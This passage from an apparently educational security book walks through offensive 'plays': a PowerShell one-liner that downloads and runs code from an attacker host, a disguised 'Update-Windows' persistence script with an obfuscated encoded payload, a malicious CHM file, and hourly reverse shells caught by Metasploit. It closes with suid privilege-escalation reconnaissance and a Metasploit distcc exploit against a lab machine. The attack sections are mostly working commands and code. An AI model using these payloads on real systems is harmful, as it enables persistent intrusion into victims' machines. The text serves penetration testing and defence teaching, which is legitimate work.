<p>We can do better than <code>meterpreter</code>. PowerSploit has a module called <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1">Persistence</a>, and that is what we use in this play. This adds persistence to the PowerShell one liner that was embedded in the <code>psmsf</code> virus we created above, namely <a href="chap03.html#download-psmsf-payload-execute"><code>download-payload-execute</code></a>, and also used in the office document <a href="chap03.html#powershell-exploitation-via-office-documents">attack with <code>nishang</code></a>. The one liner was:</p>

<figure class="code" id="persistentFetchRunPayload-ps1">
  <figcaption>persistentFetchRunPayload.ps1</figcaption>

<div class="highlight"><pre><code></code><code class="n">IEX</code> <code class="p">((</code><code class="nb">new-object</code> <code class="n">net</code><code class="p">.</code><code class="n">webclient</code><code class="p">).</code><code class="n">downloadstring</code><code class="p">(</code><code class="s1">'http://&lt;listener-attack-ip&gt;/payload.txt '</code><code class="p">))</code>
</pre></div>

</figure>

<p>I had a play with the <code>nishang</code> <a href="https://github.com/samratashok/nishang/blob/1b5aca1a1eb170befccf1d111e8902285d553289/Utility/Add-Persistence.ps1"><code>Add-Persistence.ps1</code></a> script, which may be useful for creating post-exploitation persistence, but I was looking for a solution to create an atomic persistent exploit, which is what PowerSploit provides.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis-3">Synopsis</h3>

  <p>In this play we extend the <a href="chap03.html#powershell-exploitation-via-office-documents">PowerShell Exploitation via Office Documents</a> play with the help from PowerSploit. The play below should explain everything.</p>

</aside>


<figure class="image center" style="width: 395px;">
  <img src="images/PersistentPowerShell.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p></p>

<p>You can find the video of how this attack is played out at <a href="https://youtu.be/al9RX40QuXU">https://youtu.be/al9RX40QuXU</a>.</p>

<p>If you do not already have <code>PowerSploit</code> on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.</p>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="leanpub-auto-the-play-1">The Play</h3>

  <p>All following PowerShell commands are executed as a low privileged user in ISE:</p>

  <p><code>PS C:\Source\PowerSploit\Persistence&gt; Import-Module .\Persistence</code></p>

  <p>The next command imports the <code>ScriptModification</code> module for the command we use below where we need <code>Out-EncodedCommand</code>:<br />
<code>PS C:\Source\PowerSploit\Persistence&gt; Import-Module ..\ScriptModification</code></p>

  <p>In case target runs virus with elevated privileges, you need to run:<br />
<code>PS C:\Source\PowerSploit\Persistence&gt;$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly</code><br />
In case target runs virus with standard privileges, you need to run:<br />
<code>PS C:\Source\PowerSploit\Persistence&gt;$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly</code></p>

  <p>This next command is responsible for creating the script (<a href="chap03.html#Persistence-ps1"><code>Persistence.ps1</code></a>), and its encoded form (<a href="chap03.html#EncodedPersistentScript-ps1"><code>EncodedPersistentScript.ps1</code></a>), that when downloaded from the attackers hosting location and invoked atomically by the <code>doc.chm</code> that <code>nishang</code> creates for us below, persists the contents of <a href="chap03.html#persistentFetchRunPayload-ps1"><code>persistentFetchRunPayload.ps1</code></a> in its encoded form into the targets PowerShell profile. If the target is running as administrator when they open the <code>doc.chm</code>, the contents of the <code>persistentFetchRunPayload.ps1</code> in its encoded form will be written to <code>%windir%\system32\WindowsPowerShell\v1.0\profile.ps1</code>, and an hourly scheduled task set to run <code>PowerShell.exe</code> as <code>System</code>. If the target is running as a low privileged user when they open the <code>doc.chm</code>, the contents of the <code>persistentFetchRunPayload.ps1</code> in its encoded form will be written to <code>%UserProfile%\Documents\WindowsPowerShell\profile.ps1</code>, and an hourly scheduled task set to run <code>PowerShell.exe</code> as the user. When <code>PowerShell.exe</code> runs, it implicitly runs what ever is in your <code>profile.ps1</code><br />
<code>PS C:\Source\PowerSploit\Persistence&gt;Add-Persistence -FilePath C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1</code></p>

  <p>Just as in the <a href="chap03.html#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang">PowerShell Exploitation via Office Documents</a> above, the <code>persistentFetchRunPayload.ps1</code> is used.<br />
This same script was used/embedded in the PowerShell Exploitation with Psmsf c virus <a href="chap03.html#download-psmsf-payload-execute"><code>download-payload-execute</code></a> we created above.</p>

  <p><code>Persistence.ps1</code> looks like the following:</p>

</aside>

<figure class="code" id="Persistence-ps1">
  <figcaption>Persistence.ps1</figcaption>

<div class="highlight"><pre><code></code><code class="k">function</code> <code class="nb">Update-Windows</code><code class="p">{</code>
<code class="k">Param</code><code class="p">(</code><code class="no">[Switch]</code><code class="nv">$Persist</code><code class="p">)</code>
<code class="nv">$ErrorActionPreference</code><code class="p">=</code><code class="s1">'SilentlyContinue'</code>
<code class="c"># The encoded string is the contents of persistentFetchRunPayload.ps1 encoded.</code>
<code class="nv">$Script</code><code class="p">={</code><code class="n">sal</code> <code class="n">a</code> <code class="nb">New-Object</code><code class="p">;</code><code class="n">iex</code><code class="p">(</code><code class="n">a</code> <code class="n">IO</code><code class="p">.</code><code class="n">StreamReader</code><code class="p">((</code><code class="n">a</code> <code class="n">IO</code><code class="p">.</code><code class="n">Compression</code><code class="p">.</code><code class="n">DeflateStream</code><code class="p">([</code><code class="n">IO</code><code class="p">.</code><code class="n">MemoryStr</code><code class="p">\</code>
<code class="n">eam</code><code class="p">]</code><code class="no">[Convert]</code><code class="p">::</code><code class="n">FromBase64String</code><code class="p">(</code><code class="s1">'7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7MGIzeaS7B1pRyMpqyqB\</code>
<code class="s1">ymVWZV1mFkDM7Z28995777333nvvvfe6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8izk5/73Rra5lfbVeTn86nb\</code>
<code class="s1">brM2/FVPpmWRb5s74xn1dWyrLJZ09bF8mLr43nbrh7dvbv7cG+8++nBeGe8u3d3lV2jybh916Yf37nz/wA='</code><code class="p">),[</code><code class="n">IO</code><code class="p">.</code><code class="n">Com</code><code class="p">\</code>
<code class="n">pression</code><code class="p">.</code><code class="n">CompressionMode</code><code class="p">]::</code><code class="n">Decompress</code><code class="p">)),</code><code class="no">[Text.Encoding]</code><code class="p">::</code><code class="n">ASCII</code><code class="p">)).</code><code class="n">ReadToEnd</code><code class="p">()}</code>
<code class="k">if</code><code class="p">(</code><code class="nv">$Persist</code><code class="p">){</code>
<code class="k">if</code><code class="p">((</code><code class="no">[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]</code><code class="p">::</code><code class="n">GetCurrent</code><code class="p">()).\</code>
<code class="n">IsInRole</code><code class="p">(</code><code class="no">[Security.Principal.WindowsBuiltInRole]</code><code class="s1">'Administrator'</code><code class="p">))</code>
<code class="p">{</code><code class="nv">$Prof</code><code class="p">=</code><code class="nv">$PROFILE</code><code class="p">.</code><code class="n">AllUsersAllHosts</code><code class="p">;</code><code class="nv">$Payload</code><code class="p">=</code><code class="s2">"schtasks /Create /RU system /SC HOURLY /TN Updater\</code>
<code class="s2"> /TR </code><code class="se">`"</code><code class="p">$(</code><code class="nv">$Env:SystemRoot</code><code class="p">)</code><code class="s2">\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive</code><code class="se">`"</code><code class="s2">"</code><code class="p">}</code>
<code class="k">else</code>
<code class="p">{</code><code class="nv">$Prof</code><code class="p">=</code><code class="nv">$PROFILE</code><code class="p">.</code><code class="n">CurrentUserAllHosts</code><code class="p">;</code><code class="nv">$Payload</code><code class="p">=</code><code class="s2">"schtasks /Create /SC HOURLY /TN Updater /TR </code><code class="se">`"</code><code class="s2">$\</code>
<code class="s2">($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive</code><code class="se">`"</code><code class="s2">"</code><code class="p">}</code>
<code class="n">mkdir</code> <code class="p">(</code><code class="nb">Split-Path</code> <code class="n">-Parent</code> <code class="nv">$Prof</code><code class="p">)</code>
<code class="p">(</code><code class="n">gc</code> <code class="nv">$Prof</code><code class="p">)</code> <code class="p">+</code> <code class="p">(</code><code class="s1">' '</code> <code class="p">*</code> <code class="n">600</code> <code class="p">+</code> <code class="nv">$Script</code><code class="p">)|</code><code class="nb">Out-File</code> <code class="nv">$Prof</code> <code class="n">-Fo</code>
<code class="n">iex</code> <code class="nv">$Payload</code><code class="p">|</code><code class="nb">Out-Null</code>
<code class="nb">Write-Output</code> <code class="nv">$Payload</code><code class="p">}</code>
<code class="k">else</code>
<code class="p">{</code><code class="nv">$Script</code><code class="p">.</code><code class="n">Invoke</code><code class="p">()}</code>
<code class="p">}</code> <code class="nb">Update-Windows</code> <code class="n">-Persist</code>
</pre></div>

</figure>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>The encoded form of the above script <code>Persistence.ps1</code> is <code>EncodedPersistentScript.ps1</code> and looks like the following:</p>

</aside>

<figure class="code" id="EncodedPersistentScript-ps1">
  <figcaption>EncodedPersistentScript.ps1</figcaption>

<div class="highlight"><pre><code></code><code class="n">powershell</code>  <code class="n">-E</code> <code class="s2">"cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByA\</code>
<code class="s2">GUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQ\</code>
<code class="s2">BTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADo\</code>
<code class="s2">ARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcANwBiADAASABZAEIAeABKAGwAaQBVAG0ATAAyADMASwBl\</code>
<code class="s2">ADMAOQBLADkAVQByAFgANABIAFMAaABDAEkAQgBnAEUAeQBUAFkAawBFAEEAUQA3AE0ARwBJAHoAZQBhAFMANwBCADEAc\</code>
<code class="s2">ABSAHkATQBwAHEAeQBxAEIAeQBtAFYAVwBaAFYAMQBtAEYAawBEAE0ANwBaADIAOAA5ADkANQA3ADcANwAzADMAMwBuAH\</code>
<code class="s2">YAdgB2AGYAZQA2AE8ANQAxAE8ASgAvAGYAZgAvAHoAOQBjAFoAbQBRAEIAYgBQAGIATwBTAHQAcgBKAG4AaQBHAEEAcQB\</code>
<code class="s2">zAGcAZgBQADMANQA4AEgAegA4AGkAZgB1AFAAawBmAEwAMgBjAHQAawBXADEAVABMADkAYQB6AGIASQAyADMALwA1AHUA\</code>
<code class="s2">cwBaAHgAVgBWADgAMAB2AC8AbwAyAFQAbAAxAG0AZABMAGIAYQArADkALwBxAHEAYQBLAGYAegA3AC8AOQB1AEwALwBPA\</code>
<code class="s2">DYASwBaAHIAMgB6AG0AKwBjAC8ARwA2AG4AZABWADMAVgB4AC8AegBhAHkAegBvAC8AegArAHQAOABPAGMAMAAvACsALw\</code>
<code class="s2">BoADEAVQBlAGIATAB0AHIAdwArAHEAWgBaAHQAcwBWAHoAbgBIADEAUABUADEAOQBPADYAVwBMAFcAZgAvAGUASQBtAEs\</code>
<code class="s2">AOQBNAHMAZgBaAEYAZgBiAFgAOAA1ACsAZQBsADgAMgBoADQAVwArAGIAdQB0AEwARAAzADcAYwB2AHkANgByAGYATgBz\</code>
<code class="s2">ADgAUwByAFAAWgBuAG0AOQBKAFIAKwBkAFYASQB0AFYAbgBUAGMATgB3AFIAOAAvAHoAYwA5AEwAdwBrAHQAYQBiAFgAM\</code>
<code class="s2">gBQAHYAdgAwAGkAWAAxAFQAMQB0AFgAegB3AC8AZQA5AFIAWgA1AGQANQAzAFgANwAvADAAYQBOAG4AZABiAFYANABrAG\</code>
<code class="s2">oAWAA1AHAALwB2ADAAWABiAEcAOAAyAFAAcgA0AHcAVwBUAG4AMgA3AC8AUABrADMAZgBmAEsAWQB1AHYARgBzAC8AMwA\</code>
<code class="s2">3AHYAMQBlACsAYgAyAEgAdgA5AGYARAByACsAcgBmAGUALwAvAGIAcgArAGMAbgBaADAAOAB1AFQAcQAvAGYALwBEADUA\</code>
<code class="s2">dgBUADQAOQAvADQAcwBFAFgAbgA1AC8AOQBJAE0AOQBlAFAAMwBpAHkAdQAzAHAAMQAvAGMAWABxAEYAMQAzAC8AbwBpA\</code>
<code class="s2">GYAWABpADUALwA4ADcAawAvADkANQBPADcAaQAyAGQAdQBuAFgAegB6ADQAcQBiADIARABoAHcALwB2AFAAMwBqAHcANA\</code>
<code class="s2">BOADYAOQBlADgAdgBMAHkAOAB2AHoALwBOAE0AdgA3ACsAOQArACsAWgAyADcANQArAGQAMwBmAC8AQgB3ACsAbABPAEw\</code>
<code class="s2">AbgAzAGcAeQBlAFQAbgA1AGsAdgByADkAegByAEwANAAvAFAAZwBYAE4AUgBmAG4ATAArAC8AZABQAC8AagAyAEQAdwA2\</code>
<code class="s2">AEsASAA3AHkAOQBmAC8AZgBCAHYAVgBkADEAZAByADgAOABuAC8AeABrAC8AbQBaADUAOABPAGwAeQBNAHEAbQAvADIAT\</code>
<code class="s2">AB2ADcANwBDAGQAZgByAGgAYgBmAGYAVABXADUAMwB6AHoAWQBmADcAZgBjAG4AWAAzADMAdQBuADcAKwBuAFoALwBhAG\</code>
<code class="s2">UAVABoADUAZAByAEIANABYAHUALwBmAFcAMAA3AHEAKwBZAFAAWgA1AGUAVAB5AHcAZgBUAHoAVAB3ADQAKwArAFcAVAA\</code>
<code class="s2">1AEoAUAA4ADgAUAAxAGoAZgBtADkAMAByAGYAMwBMAHYAcAA2ADgAbgA4ADQAZQA3AG4ALwA0ACsANQAvAGMAZQBMAEgA\</code>
<code class="s2">OQB3ADkAKwByADQAcwA0AC8AdgBqAEwANwBYAEkAWgAzADMAKwB4AGYAVgBMAEMAYwBTAFAAYwAyAG4AKwB0AGsAZABhA\</code>
<code class="s2">HYANABtAGYAOQBlAE8AVAA1AGYAVABhAGsAYgBVAG8AbQArAFAAWAA1ACsAYwBuAGQAMgA1AE0AOABaAGMAdgBLAGwATw\</code>
<code class="s2">BsADcATwB0AE8ANwAvAGsATgAwADYASwA4AHkAMAA3ADkANwArAFkALwB5AFMAZQB5AEsAZgByAHUAbQBpAHYAeAB5ACs\</code>
<code class="s2">ASgAwAE4ATgBpAGwAWgBWAGoANQBSAHYANwB3AGYAYwAzAE4ARABxAGIARQBaAC8AUQBOADkAVABuADUAMwBsADcAcwBx\</code>
<code class="s2">ADYASgBnAGQAbwB0ADYAdgBtAHMATwBWAHUAKwBxAHMAcAA4AFUAdwA5AFAAMQBrAFgAWgBTAHIAUAB2AGYAMwB3ADgAV\</code>
<code class="s2">wB4AFIATAB3AHEAegBPADIAcQByACsAKwBBADQAeAA1AHkALwArADMAVgA3AFcAMQBmAGwAbgB2ADkAdgBMAFYAMQA4AC\</code>
<code class="s2">sATwAzAHQAKwBPAGoANAB1AHkANgA4AGEAUQBwADkAKwBmAHIAdABxADIAdQBiAHcAZAAzAHUAWgBYAFoAZABWAE4AdgB\</code>
<code class="s2">2AHMAbwAyAFkANgBiADcAUABtAGIAWgBQAGUAUABTAEYAZQBhAHYAUAAwADcAcQB1AHYAMAB1AGEANgBhAGYATgBGAGUA\</code>
<code class="s2">dgBmADEAUwBmAHIAdABMADcAOQA2ADkAZgB6ADMAUwBlACsAKwBlAGEASABDAFUAZABQAHYAcgA5AEkALwA0AEsAUABmA\</code>
<code class="s2">GIAZQB0ADMATwAxADEAZQBQAG4AcgBOAFQAVgA5AFYAVgBYAHYAbgA5ADUAWABmADcAKwAzADkAdgBvAFkATwAxAFYAVg\</code>
<code class="s2">BlAHYANQA3AG4AWgBmAG4ANwBYAHUANgBPAGQAMwA3AGYARgBmADUAdQA4AFAAYwA0AGYANQBlAG4AMgB5ACsAcQA1AGQ\</code>
<code class="s2">AbQBTAEkARwBZAGsAUgBaAGYANQBIAC8ARABSAFIAMABUAHAAdgBHAHoAeQAvAGcAQwBVAFAAQgBqAEUAcgBjAGIAdwBj\</code>
<code class="s2">ADQARAA0ADQAdQAyAHMAcQBOAE8AdAAxADYAdQB5AGEATABkAGYAWgB1ADAAOABwAFgAKwBCAGQATQBwAGoAbwBWAG4AW\</code>
<code class="s2">gB1AHAAagBxADcAKwBrAG4ANgBkAGIASAA2AGMAZgBwAHQAOQBKAFAAZAAzAGIAbwBEADkAVQBRAGQAMwA3AG0AeQAzAF\</code>
<code class="s2">cANwAvAFkAdwAwAGkATABSAEwAdAA1ADkAVgB4AEcAegA1AHUAOQBTAE0AbABSAHUAOABXAEoAZgBsAGIANQB4ADgAbAB\</code>
<code class="s2">6AGcAagAzADYAYQAvAFYAKwB2AFcAZgB1ADgAUgBVAEUAQwBPAHoANQBhAFgAMQBkAHUAYwBtAGYAaQBYAGQATgBRAGIA\</code>
<code class="s2">SQBTAGcAcwAvAFIAcwBuAHYAMwBIAHkALwB3AEEAPQAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuA\</code>
<code class="s2">EMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeA\</code>
<code class="s2">B0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA"</code>
</pre></div>

</figure>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p><code>EncodedPersistentScript.ps1</code> now needs to be hosted somewhere. As in the above plays, we will host it on our Kali Linux VM (in <code>/var/www/html/</code>), that we have already used, and will be continuing to:<br />
1. Listen for the reverse shell<br />
2. Host <code>powershell_hacking.bat</code> as <code>/var/www/html/payload.txt</code><br />
As in the previous plays, Start your web server if it is not still running:<br />
<code>Service apache2 start</code><br />
I tried downloading and <code>I</code>nvoking <code>EX</code>pression from ISE using both:</p>

</aside>

<figure class="code">
<div class="highlight"><pre><code></code><code class="n">IEX</code> <code class="p">((</code><code class="nb">new-object</code> <code class="n">net</code><code class="p">.</code><code class="n">webclient</code><code class="p">).</code><code class="n">downloadstring</code><code class="p">(</code><code class="s1">'http://&lt;listener-attack-ip&gt;/Persistence.ps1 '</code><code class="p">\</code>
<code class="p">))</code>
<code class="c"># and:  </code>
<code class="n">IEX</code> <code class="p">((</code><code class="nb">new-object</code> <code class="n">net</code><code class="p">.</code><code class="n">webclient</code><code class="p">).</code><code class="n">downloadstring</code><code class="p">(</code><code class="s1">'http://&lt;listener-attack-ip&gt;/EncodedPersistent\</code>
<code class="s1">Script.ps1 '</code><code class="p">))</code>
</pre></div>

</figure>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>before doing the same by running the <code>doc.chm</code> we create below. Both <code>Persistence.ps1</code> and <code>EncodedPersistentScript.ps1</code> gave me problems initially. It turned out that the actual file encoding of both files was not right. If you just copy either of the files from your Windows attack VM to your hosting directory on your Kali Linux VM, you may have the same issue. I ended up creating a new file in the hosting location and copy-&gt;pasting the file contents into the new file, and that worked. the first part of the error from <code>IEX</code> in ISE for <code>Persistence.ps1</code> was:</p>

  <p><code>The term 'f u n c t i o n ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:19</code></p>

  <p>For <code>EncodedPersistentScript.ps1</code> it was:</p>

  <p><code>The term 'p o w e r s h e l l ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:23</code></p>

  <p>See the funny characters? That is what gave it away.</p>

  <p>Now we can create our <code>doc.chm</code> or what ever you want to call it, informing <code>Out-CHM</code> that we want the payload of <code>doc.chm</code> to be the script (<a href="chap03.html#EncodedPersistentScript-ps1"><code>EncodedPersistentScript.ps1</code></a>) we just created and hosted, that when downloaded and invoked, will persist the contents of <a href="chap03.html#persistentFetchRunPayload-ps1"><code>persistentFetchRunPayload.ps1</code></a> in its encoded form to the PowerShell profile that belongs to the user that opened <code>doc.chm</code>. Run the following commands to create the <code>doc.chm</code>:<br />
<code>PS C:\Source\nishang\Client&gt; Import-Module .\Out-CHM.ps1</code><br />
<code>PS C:\Source\nishang\Client&gt;Out-CHM -PayloadURL http://&lt;listener-attack-ip&gt;/EncodedPersistentScript.ps1 HHCPath C:\Program Files (x86)\HTML Help Workshop</code></p>

  <p>Now it is time to setup our listening Metasploit ready to catch the reverse shell when our target runs the <code>doc.chm</code>. We use the same <code>powershell_msf.rc</code> resource file that <code>psmsf</code> created for us in the <a href="chap03.html#powershell-exploitation-with-psmsf-play">PowerShell Exploitation with Psmsf</a> play above.<br />
Start your listener using the <code>powershell_msf.rc</code> resource rile:<br />
<code>msfconsole -r powershell_msf.rc</code></p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <p>Now you need to get the <code>doc.chm</code> onto your targets machine or a network share that your target can access/copy from, and persuade your target to run the <code>doc.chm</code>. When they do, as discussed above, <code>EncodedPersistentScript.ps1</code> will be downloaded and invoked, which will write the embedded encoded contents of <code>persistentFetchRunPayload.ps1</code> to the PowerShell profile, and setup a scheduled task. When the task fires, as in the previous attacks, the <code>payload.txt</code> will be downloaded and its expression invoked, which will cause the reverse shell to be executed. The listening Metasploit will catch the shell. If you have the scheduled task configured to run every hour, then you will get a reverse shell every hour. This survives reboots and most other actions any user will take, other than removing the PowerShell profile contents we created or removing the scheduled task.</p>

</aside>

<p>The PowerSploit Persistence module offers the following persistence techniques:</p>

<ul>
  <li>PermanentWMI</li>
  <li>ScheduledTask (as we have just seen)</li>
  <li>Registry</li>
</ul>

<p>At the following stages:</p>

<ul>
  <li><code>AtLogon</code></li>
  <li><code>AtStartup</code></li>
  <li><code>OnIdle</code></li>
  <li><code>Daily</code></li>
  <li>
<code>Hourly</code> (as we have just seen)</li>
  <li>
<code>At</code> (specify specific times)</li>
</ul>

<aside class="information blurb">
    <p>Be aware if you want to use the <code>OnIdle</code> parameter, that the Windows Task Scheduler service only checks every 15 minutes to see if the computer is in an idle state. The computer is considered to be <a href="https://social.technet.microsoft.com/Forums/windows/en-US/692783e7-bb73-45d1-95d6-8f2d1363d6c7/cant-get-task-schedular-to-run-a-batch-on-idle?forum=w7itprogeneral">idle if</a>:</p>

  <p>1) A screen saver is running, or<br />
2) if no screen saver is running, the CPU is at 0% usage, and there is 0% disk I/O for 90% of the past fifteen minutes, and if there has been no keyboard or mouse input for that period of time.</p>

</aside>

<aside class="tip blurb">
    <p>The easiest way to kill many instances of <code>powershell</code> when you are experimenting is to run the following command:<br />
<code>taskkill /F /IM powershell.exe /T</code></p>

</aside>

<p>There are many ways to achieve persistence. I have not included any lateral movement or privilege escalation amongst these PowerShell plays, but feel free to take your post exploitation further. Even the tools we have used in these plays have a good variety of both.</p>

<h4 id="leanpub-auto-unnecessary-and-vulnerable-services">Unnecessary and Vulnerable Services</h4>

<h5 id="vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation">Overly Permissive File Permissions, Ownership and Lack of Segmentation</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>A lack of segmenting of a file system, according to what is the least amount of privilege any authorised parties require is often the precursor to <strong>privilege escalation</strong>.</p>

<p>Privileged services that are started on system boot by your init system (as discussed under the <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit">Proactive Monitoring</a> section) often run other executable files whether they be binaries or scripts.</p>

<p>When an executable (usually run as a daemon) is called by one of these privileged services and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable if they think it will go unnoticed.</p>

<p>If we take the path of least resistance when setting up our partitions on installation by combining file system resources that have lesser requirements for higher privileges, together with those that have greater requirements, then we are not applying the principle of least privilege. What this means is that some resources that do not need the extra privileges in order to do their job, get given them anyway. This allows attackers to take advantage of this, by swapping in (writing) and executing malicious files, directly or indirectly.</p>

<p>If the target file that an attacker wants to swap for a trojanised version is world writeable, user writeable or even group writeable, and they are that user or in the specified group, then they will be able to swap the file Unless the mounted file system is restrictive enough to mitigate the action.</p>

<ol id="vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations" class="numeric">
  <li>The first risk is at the file permission and ownership level
    <ol class="numeric">
      <li>The first tool we can pull out of the bag is <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privesc-check</a>, which has its source code on <a href="https://github.com/pentestmonkey/unix-privesc-check">github</a> and is also shipped with Kali Linux, but only the 1.x version (<code>unix-privesc-check</code> single file), which is fine, but the later version which sits on the master branch (<code>upc.sh</code> main file plus many sub files) does a lot more, so it can be good to use both. You just need to get the shell file(s) from either the <code>1_x</code> or <code>master</code> branch onto your target machine and run. Running as root allows the testing to be a lot more thorough for obvious reasons. If Im testing my own host, I will start with the <code>upc.sh</code>, I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply looking at the main file will give you a good idea of the options, or you can just run:<br />
 <code>./upc.sh -h</code>  
        <p>To run:<br />
 <code># Produces a reasonably nice output</code><br />
 <code>./upc.sh &gt; upc.output</code>  </p>
      </li>
      <li>
<a href="https://github.com/rebootuser/LinEnum">LinEnum</a> is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.<br />
 Also check the <a href="chap07.html#additional-resources-vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation">Additional Resources</a> chapter for other similar tools for both Linux and Windows.</li>
    </ol>
  </li>
  <li>The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying as restrictive as possible permissions to granular file system partitioning is so effective.
    <ol class="numeric">
      <li>The first and easiest command to run is:<br />
 <code>mount</code><br />
 This will show you the options that all of your file systems were mounted with. In the Countermeasures we address how to improve the permissiveness of these mounted file systems.</li>
      <li>For peace of mind, I usually like to test that the options that our file systems appear to be mounted with actually are. You can make sure by trying to write an executable file to the file systems that have <code>noexec</code> as specified in <code>/etc/fstab</code> and attempt to run it, it should fail.</li>
      <li>You can try writing any file to the file systems that have the <code>ro</code> (read-only) option specified against them in the <code>/etc/fstab</code>, that should also fail.</li>
      <li>Applying the <code>nosuid</code> option to your mounts prevents the <code>suid</code> (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong>) bit on executables from being respected. If for example we have an executable that has its <code>suid</code> bit set, any other logged in user temporarily inherits the file owners permissions as well as the UID and GID to run that file, rather than their own permissions.</li>
    </ol>
  </li>
</ol>

<p>Running a directory listing that has a file with its <code>suid</code> bit set will produce a permission string similar to <code>-rwsr--r--</code><br />
The <code>s</code> is in the place of the owners executable bit. If instead a capitol <code>S</code> is used, it means that the file is not executable</p>

<p>All <code>suid</code> files can be found with the following command:<br />
<code>find / -perm -4000 -type f 2&gt;/dev/null</code></p>

<p>All <code>suid</code> files owned by root can be found with the following command:<br />
<code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></p>

<p>To add the <code>suid</code> bit, you can do so the symbolic way or numeric.</p>

<p>symbolic:<br />
<code>chmod u+s &lt;yourfile&gt;</code></p>

<p>numeric:<br />
<code>chmod 4750 &lt;yourfile&gt;</code></p>

<p>This adds the <code>suid</code> bit, read, write and execute for <code>owner</code>, read and execute for <code>group</code> and no permissions for <code>other</code>. This is just to give you an idea of the relevance of the <code>4</code> in the above <code>-4000</code>, do not go setting the <code>suid</code> bits on files unless you fully understand what you are doing, and have good reason to. This could introduce a security flaw, and if the file is owned by root, you may have just added a perfect vulnerability for an attacker to elevate their privileges to root due to a defect in your executable or the fact that the file can be modified/replaced.</p>

<p>So for example if root owns a file and the file has its <code>suid</code> bit set, anyone can run that file as root.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/HandsOnHack.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>We will now walk through the steps of how an attacker may carry out a privilege escalation.</p>

<p>You can find the video of how it is played out at <a href="https://youtu.be/ORey5Zmnmxo">https://youtu.be/ORey5Zmnmxo</a>.</p>

<aside class="information blurb">
    <h3 id="leanpub-auto-synopsis-4">Synopsis</h3>

  <p>First we carry out some reconnaissance on our target machine. I am using Metasploitable2 for this play.<br />
We find a suitable open port with a defective service listening, that is our Vulnerability Scanning / Discovery stage.<br />
We then search for an exploit that may be effective at giving us at least low privilege access to the machine.<br />
We then use the tools I have just discussed above to help us find possible writeable, executable directories and/or files.<br />
We then search for exploits that may help us escalate our privileges, based on an area in the file system that we now know we have write and execute permissions on.<br />
We then walk through understanding a chosen exploit and preparing it to be run.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
    <h3 id="leanpub-auto-the-play-2">The Play</h3>

  <p>A simple nmap scan will show us any open ports.<br />
One of the ports is 3632, with the <code>distcc</code> (distributed compiler, useful for speeding up source code compilation) daemon listening.  </p>

  <p>Let us check to see if Metasploit knows about any <code>distcc</code> exploits?</p>

  <p><code>msfconsole</code><br />
<code>msf &gt; db_rebuild_cache</code><br />
<code>msf &gt; search distcc</code><br />
<code>msf &gt; use exploit/unix/misc/distcc_exec</code><br />
<code>msf exploit(distcc_exec) &gt; set RHOST metasploitable</code><br />
<code>msf exploit(distcc_exec) &gt; exploit</code><br />
